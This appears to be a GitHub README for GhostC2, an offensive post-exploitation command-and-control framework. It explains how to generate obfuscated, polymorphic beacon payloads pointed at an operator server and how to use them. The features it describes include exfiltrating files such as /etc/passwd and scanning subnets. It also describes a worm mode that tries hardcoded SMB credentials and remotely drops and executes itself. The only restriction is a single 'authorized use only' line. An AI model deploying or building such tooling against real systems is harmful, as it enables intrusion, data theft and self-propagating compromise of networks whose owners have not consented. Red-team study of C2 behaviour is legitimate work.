# 👻 GhostC2

GhostC2 is a modular, encrypted, post-exploitation command-and-control (C2) framework built with Python and Flask. It features real-time WebSocket communication, polymorphic payload generation, operator authentication, and optional `.exe` packaging. 

Check out the wiki for an Operator Quickstart Guide.

---

## 🚀 Features

- 🔐 AES-256 encrypted communication (symmetric)
- 🌐 Real-time bidirectional WebSocket tasking
- 🧠 Operator web console with live terminal view
- 🧼 Polymorphic payload generator with randomized variables
- 🖥️ Optional `.exe` compilation with PyInstaller
- 🛡️ Flask-Login based access control
- 🗞️ SQLite-based task/result logging
- 🔍 Network Port Scanning (`scan <subnet> ports:<port1>,<port2>...`)
- 🧬 Self-Propagating Worm Mode via SMB

---

## 📁 Project Structure

```
GhostC2/
├── builds/                 # Compiled payloads (.py, .exe)
├── output/                 # (Optional legacy output dir)
├── payloads/               # WebSocket and polling Python agents
│   └── ghost_socket_payload.py
├── server/
│   ├── app.py              # Main Flask + SocketIO server
│   └── templates/          # HTML templates for dashboard, console, login
├── tools/
│   └── generate_payload.py # Payload generator script
├── utils/
│   └── crypto.py           # AES encrypt/decrypt helpers
└── README.md
```

---

## ⚙️ Setup

### 1. Install dependencies
```bash
pip install flask flask-login flask-socketio eventlet pyinstaller
```

### 2. Run the server
```bash
cd server
python app.py
```

Visit [http://localhost:8080](http://localhost:8080)

**Default Login:**
```
Username: admin
Password: ghostpass123
```

---

## 👾 Payloads

### ✅ WebSocket Agent *(experimental – not recommended for active use)*
```bash
python payloads/ghost_socket_payload.py
```

---

### 🧼 Generate Polymorphic Payload *(recommended)*
```bash
# Generate Python payload
python tools/generate_payload.py

# With .exe output
python tools/generate_payload.py --exe
```

---

### 🌐 Example: Generate payload for 10.10.10.10
```bash
python tools/generate_payload.py \
  --c2 http://10.10.10.10:8080/beacon \
  --result http://10.10.10.10:8080/result
```

To also compile to `.exe`:
```bash
python tools/generate_payload.py \
  --c2 http://10.10.10.10:8080/beacon \
  --result http://10.10.10.10:8080/result \
  --exe
```

---

## 🖥️ Live Console Terminal

GhostC2 includes a web-based console for interacting with beacons in real-time.

### ✅ Features

- WebSocket-powered command/result loop
- Real-time session interaction
- Preloaded recon commands
- JSON result support (e.g., `scan`)
- Beacon targeting + logging

---

## 📂 File Exfiltration

### Command
```bash
getfile /etc/passwd
```

Agent will:
1. Base64 the file
2. AES encrypt the result
3. Send to server
4. Server saves to `server/downloads/<hostname>/`

---

## 🔍 Network Scanning (New)

### Command
```bash
scan 192.168.0.0/24 ports:80,443,445,3389
```

Agent will:
- Scan the provided subnet and ports
- Return open/closed results in JSON
- Format them in the dashboard

### Example Output
```
$ scan 127.0.0.1/32 ports:80
{
  "127.0.0.1": {
    "80": "open"
  }
}
```

---

## 🧬 Worm Propagation Mode (New)

Payloads generated with `--worm` will:
- Scan local subnet for port 445
- Try hardcoded SMB creds
- Drop and remotely execute `worm.py`

Useful for:
- Simulating worm-like behavior
- Lateral movement in test labs

---

## 🔐 Security Notes

- AES-encrypted traffic throughout
- Operator auth required for all access
- Session isolation by beacon hostname

---

## 🧪 Red Team Use Cases

| Scenario              | Usage                                    |
|----------------------|------------------------------------------|
| Post-exploitation    | Remote shell via encrypted WebSocket     |
| Payload generation   | Obfuscated `.py` or `.exe` files         |
| Operator dashboards  | Web UI for task/result review            |
| C2 simulations       | Train detection or analyze traffic       |

---

## ⚠️ Legal

GhostC2 is for **authorized red team or academic use only**.

---

## 🧠 Built by Edward Wolfgang

- GitHub: [@wolfwashere](https://github.com/wolfwashere)
- Project: GhostC2 v1.0

Contributions welcome.
